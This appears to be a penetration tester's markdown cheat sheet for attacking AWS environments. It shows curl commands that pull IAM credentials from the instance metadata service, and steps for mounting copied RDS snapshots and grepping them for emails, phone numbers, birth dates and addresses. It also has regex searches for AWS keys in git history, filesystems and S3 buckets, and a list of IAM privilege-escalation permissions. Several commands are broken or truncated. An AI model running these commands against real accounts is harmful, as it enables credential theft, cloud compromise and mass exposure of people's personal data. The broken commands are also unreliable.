### Query Instance Metadata Service for Security Credentials

1. Get Role from metadata server
```bash
curl http://$IP/latest/meta-data/iam/security-credentials/
```
this will output a role name that can  be used in step 2.
2. Get credentials for specific role
```bash
curl http://$IP/latest/meta-data/iam/security-credentials/ra-internal-<#RoleID>
```
This will output the AccessKeyID, SecretAccessKey and Token

3. Use these credentials to use the aws cli


### Find IIS and interestng data in huge AWS databases
1. Look for large unencrypted RDS database snapshots
2. Copy/Cline them to a storage volume and attach it to the ec2 instance
3. Run 'sudo lsblk' on that ec2 instance to find the new storage volumne
4. Mount the new storage volume and prase the file system data or even the deleted/RAW disk data in the slack space using forensic tools like sleuthkit, samdump2

Example egrep sequence
```bash 
egrep '\@gmail' /my/mounted/unencrypted/rds/snapshot/* | egrep -v 'robl' | egrep -i zip | egrep -i 'phone=[0-9]' | egrep -i 'dob|birth' | egrep -i address | tr '&' '\n' | egrep -i 'name|address|city|state|dob|birth|phone|zip|mail' | head -n 25 | sed -e 's|%20| |g' -e 's|%2F|/|g'
```

### Find AWS Creds

#### Git Log
```bash
# Search for all common start pattern
for repo in ./*; do pushd "${repo}"; git log -G '(ABIA|ACCA|AGPA|AIDA|AIPA|AKIA|ANPA|ANVA|APKA|AROA|ASCA|ASIA)[A-Z0-9]{12}' -p --all | cut -c -80; popd; done

# Search for AKIA
for repo in ./*; do pushd "${repo}"; git log -G '(AKIA)[A-Z0-9]{12}' -p --all | cut -c -80; popd; done

# Search for password
for repo in ./*; do pushd "${repo}"; git log -G 'password=' -p --all | cut -c -20; popd | 
```
git log -G

-G = regex
-p = generates patch text, similar to diff
-- all = show everything

#### Linux 
```bash
Find AWS Secrets + exclude dir
sudo grep --exclude-dir=/proc -rnG '(ABIA|ACCA|AGPA|AIDA|AIPA|AKIA|ANPA|ANVA|APKA|AROA|ASCA|ASIA)[A-Z0-9]{12}' / 2> /dev/null
```

### AWS Keys and IDs

Get Account ID: `aws sts get-caller-identity`

aws iam list-access-keys --user-name myuser --profile superuser/normie

**tie users to Access Keys**
```bash
python3 ./aws --profile myprofile iam list-users --output text | tr '\t' '|' | sed -e 's@||@|N/A|@g' | tr '|' '\t' | column -t
```

### Buckets
Interesting Link --> https://bobbyhadz.com/blog/aws-cli-list-all-files-in-bucket

#### Search  buckets
List all files in bucket
```bash
aws s3 --profile engineer ls $BucketName | awk '{eprint $4}' | xargs -I FNAME sh -c "echo FNAME"
# or

AWS_ACCESS_KEY_ID=xxx AWS_SECRET_ACCESS_KEY=xxx s3 ls $BucketName' | awk '{print $4}' | xargs -I FNAME sh -c "echo FNAME; 
```

Search all files in bucket for string
```bash
aws s3 ls $BucketName --profile engineer | awk '{print $4}' | xargs -I FNAME sh -c "echo FNAME; aws s3 cp s3://$BucketName/FNAME - --profile engineer" | grep -C 3 -P 'password='

```

Search all files in bucket for AWS Keys/Secrets)
Typically these start with the following characters ABIA|ACCA|AGPA|AIDA|AIPA|AKIA|ANPA|ANVA|APKA|AROA|ASCA|ASIA.

```bash
AWS_ACCESS_KEY_ID=xxx AWS_SECRET_ACCESS_KEY=xxx aws s3 ls $BucketName | awk '{print $4}' | xargs -I FNAME sh -c "echo FNAME; AWS_ACCESS_KEY_ID=xxx AWS_SECRET_ACCESS_KEY=xxx aws s3 cp s3://$BucketName/FNAME - | grep -C 3 -P '(ABIA|ACCA|AGPA|AIDA|AIPA|AKIA|ANPA|ANVA|APKA|AROA|ASCA|ASIA)[A-Z0-9]{12}'" | less
```

#### Get object froom bucket AKA downloading it
```bash
aws s3api get-object --bucket $BucketName --key local_trackage.csv outfile local_trackage.csv --profile engineer

aws s3api get-object --bucket $BucketName --key certs outfile certs --profile engineer
```

### pacu
All-In-One AWS tool. It's great

### Priv esc
https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
Check permissions for:

- iam:CreatePolicyVersion
- iam:SetDefaultPolicyVersion
- iam:PassRole and ec2:RunInstances
- iam:CreateAccessKey
- iam:CreateLoginProfile
- iam:UpdateLoginProfile
- iam:AttachUserPolicy
- iam:AttachGroupPolicy
- iam:AttachRolePolicy
- iam:PutUserPolicy
- iam:PutGroupPolicy
- iam:AddUserToGroup
- iam:UpdateAssumeRolePolicy and sts:AssumeRole
- iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction
- iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping (and possibly dynamodb:PutItem and dynamodb:CreateTable) permissions, but without the lambda:InvokeFunction
- lambda:UpdateFunctionCode
- iam:PassRole and glue:CreateDevEndpoint
- glue:UpdateDevEndpoint
- iam:PassRole and cloudformation:CreateStack
- iam:PassRole, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition


### Troubleshooting
AWS Authentication via CLI
https://bobbyhadz.com/blog/aws-cli-security-token-included-request-invalid
